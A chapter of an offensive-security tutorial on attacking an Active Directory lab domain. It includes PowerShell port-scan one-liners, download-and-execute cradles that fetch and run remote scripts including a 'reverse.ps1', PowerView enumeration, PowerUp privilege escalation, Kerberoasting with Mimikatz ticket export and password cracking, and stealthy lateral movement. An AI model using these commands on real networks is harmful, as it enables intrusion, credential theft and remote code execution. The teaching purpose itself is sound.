### 4.1  Internal Infrastructure Overview

### 4.2  Infrastructure Enumeration
 • Here, we will try to focus more on mapping the networking devices, hosts present in the Internal environment.
 • The Attackers leverage in-built tools to enumerate and map live hosts in the environment.
 • Since, the internal network mostly comprises of Active Directory environment, we will focus on Abusing the mis-configuation.s. 
 • Tools like nmap, netcator built-in utilities like PowerShell can also be used for enumeration purposes. 
 • Below is the command for scanning open TCP ports from a PowerShell Query.
 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null

#### 4.2.1  Internal Network Enumeration
Reference: https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/
• Below command will scan IP addresses 10.1.1.1-5 and some specific common TCP ports.
 1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null}

#### 4.2.2  Active Directory Essentials
 • In the local environment we have 3 machines setup in a domain environment.
 • One can use Windows PowerShell, Windows native executable for the enumeration and exploitation purposes.
 • In-scope IP address range : 
   − 10.10.10.2    Domain Controller 
   − 10.10.10.3    Application Server
   − 10.10.10.4    Employee System

 • Windows PowerShell
   • It is a .NET interpreter which comes installed by-default on all Windows versions.
   • One can execute binaries and scripts completely in-memory using PowerShell.
   • Through PowerShell one can administer a network and provides access to manage Active Directory environment.
   • Useful for Lateral Movement scenarios
   • PowerShell Remoting
   • Web-Based PowerShell Remoting

• Invoking a PowerShell Module
   • Scripts with extension “*.ps1”, “*.psm1”, “*.psd1” etc can be invoked in a specific PowerShell session as follows : 
     Import-Module <Module_Name.ps1>
   • However a PowerShell script can be invoked in a unique way called “dot sourcing a script” 
     . .\<Script_Name>.ps1

• PowerShell in-memory Download and Execute cradle :  
  $down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1") 
  $read = $down.GetResponse() 
  IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()
  iex(iwr'http://192.168.2.2/file.ps1')
  $file=New-Object -ComObject Msxml2.XMLHTTP;$file.open('GET','http://192.168.2.2/file.ps1',$false);$file.send();iex$file.responseText

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.2.2/reverse.ps1 ‘);
sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex$response 
iex(New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')

### 4.3 Active Directory Phases Exploitation
 Internal Network Attack Simulation Cycle

 • Recon
   • We already have access to the internal environment.
   • Credentials of a user is found on the Web-Server, which gave us access to the Employee-Machine.
   • In-built functionalities like PowerShell and WMI can be used for situational awareness in the network.
   • Adversary always heads for the direction of placement or setup of critical asset of a company.

Domain Enumeration
• We will use PowerView
   • Get current domain : for enumeration.
     Get-NetDomain
     Get-NetDomain–Domain cyberwarfare.corp
   • Retrieve Current SID and Domain Controller 
     Get-NetDomainController–Domain cyberwarfare.corp
     Get-DomainSID

• Retrieve a list of users in the current domain : 
   Get-NetUser
   Get-NetUser–UserNameemp1

• Retrieve a list of computers in the current domain : 
   Get-NetComputer
   Get-NetComputer–FullData
   Get-NetComputer–OperatingSystem“Windows Server 2016 Standard”

• List all domain groups in the current domain : 
   Get-NetGroup
   Get-NetGroup–FullData
   Get-NetGroup–Domain cyberwarfare.corp

• Enumerate privilege domain group members and local administrators group members. 
   Get-NetGroupMember–GroupName“Domain Admins” -verbose 
   Get-NetLocalGroup–ComputerNameDC-01  -ListGroups

• ACL Enumeration, get the ACLs associated with an entity:
   Get-ObjectAcl-SamAccountName<Domain_User> –ResolveGUIDs
• Unique and interesting ACL Scanning :
   Invoke-ACLScanner–ResolveGUIDs
• Enumerate Domain Trusts : 
   Get-NetDomainTrust
   Get-NetDomainTrust–Domain cyberwarfare.corp

• Enumerate all domain in a Forest :
   Get-NetForestDomain–Verbose
   Get-NetForest -Verbose
• Find computer sessions where current user has local admin access : 
   Find-LocalAdminAccess-Verbose

#### Local Privilege Escalation
• An Adversary tries to escalate privileges from low to high (Administrator, root)
• There are various vulnerabilities that can be abused on Windows/Linux environment :
   • Abuse Elevation Control Mechanism
   • Access Token Manipulation 
   • Boot or Logon Auto-start Execution
   • Process Injection
   • Scheduled Task/Job
   • Valid Accounts

• PowerUP can be used to escalate locally in a Windows environment.
   . .\PowerUP.ps1
   Invoke-AllChecks–Verbose
   • List services which can be configured : 
     Get-ModifiableService -Verbose
   • Unquoted Service Path : 
     Get-ServiceUnquoted-Verbose

### Admin Reconnaissance
• With enough privileges on the Local machine the Adversary will try to perform where Admin users are logged-on. Technique Example : Credential Dumping
• Service accounts generally have Administrator privileges in a machine.
• Well-known attacks like Kerberoasting can be used to brute-force service account credentials.
• We need to find users where a high-privilege domain user like Domain Admin has sessions, this can be done using “Invoke-UserHunter” query.
--> Kerberoasting
• We send all the required details to DC to get a valid TGT, this TGT can be used to get a TGS (for authorization) to access any specific service.
• Upon getting the TGS (encrypted with target service account hash), one can export it and then brute-force it against a password dictionary.
• Also, Administrator generally do not focus on changing the credentials of non-machine service account, we end up getting the clear-text credentials ☺
• In-short, it is the offline brute-forcing of service account credentials.

1. Domain User Name with current time is sent to DC in encrypted form
2. DC decrypts the message & perform a check if everything is OK
3. Got TGT
4. Client Stores TGT in memory & it can be re-requested by local session manager
5. TGT enc with krbtgthash, request a TGS (TGS-REQ)
6. TGS is enc with target service NTLM hash
7. Client using the allotted TGS are authenticated as well as authorized to access DB server
8. Other optional validation requests with the DC is performed.

• Find User accounts which are used as service accounts : 
   Get-NetUser–SPN
• We request the TGS aka service ticket : 
   Request-SPNTicket
• Check ticket in-memory: 
• Export ticket using Mimikatz :
   klist
   Invoke-Mimikatz -Command '"kerberos::list /export“’
• Now, Crack the Service account password using tgsrepcrack.py
   python.exe .	gsrepcrack.py .\passwords.txt ‘.\Ticket.kirbi'

#### Lateral Movement
• The Adversary will try to move laterally in the environment in search for some critical servers/assets.
• Some of the techniques that can be used are :  
   • PowerShell Remoting
   • Windows Management Instrumentation (WMI)
   • Invoke-Mimikatz.ps1 etc
• It is advised to choose a method which is stealth and leave almost no footprints on ANY machines the Adversary is targeting.

--> PowerShell Remoting
• It used WinRM protocol and runs by-default on TCP ports 5985 (HTTP) and 5986 (HTTPS)
• It is a recommended way to manage Windows core servers.
• This comes enabled by-default from Windows Server 2012.
• Adversary uses this utility to connect to remote computers/servers and execute commands upon achieving high privileges.
• Example : Invoke-Command, New-PSSession, Enter-PSSession

• Configuration is easy “Enable-PSRemoting-SkipNetworkProfileCheck-Verbose -Force” as administrator.
• It is used to run commands and scripts on : 



### 4.1  Internal Infrastructure Overview

### 4.2  Infrastructure Enumeration
  #### 4.2.1  Internal Network Enumeration
  #### 4.2.2  Active Directory Environment
### 4.3  Active Directory Phases Exploitation
